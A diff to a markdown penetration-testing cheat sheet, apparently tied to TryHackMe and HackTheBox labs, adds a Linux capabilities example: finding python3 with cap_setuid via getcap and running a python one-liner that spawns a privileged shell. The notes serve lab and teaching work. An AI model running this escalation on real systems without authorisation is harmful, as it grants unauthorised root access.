@@ -58,6 +58,7 @@ When exploiting a command, you will usually want to run another executable. Two 
 ## Capabilities
 
 [![linprivesc](../../../_badges/thm/linprivesc.svg)](https://tryhackme.com/room/linprivesc)
+[![cap](../../../_badges/htb-p/cap.svg)](https://app.hackthebox.com/machines/Cap)
 
 <div class="row row-cols-lg-2"><div>
 
@@ -75,6 +76,12 @@ $ getcap -r / 2>/dev/null
 ➡️ Look for the executable on [GTFOBins](tools/gtfobins.md)
 
 ➡️ Use the same techniques as for [SUID/GUID](#suidguid-bit) files not on GTFOBins
+
+```ps
+$ getcap -r / 2>/dev/null
+/usr/bin/python3 = cap_setuid
+$ /usr/bin/python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+```
 </div></div>
 
 <hr class="sep-both">
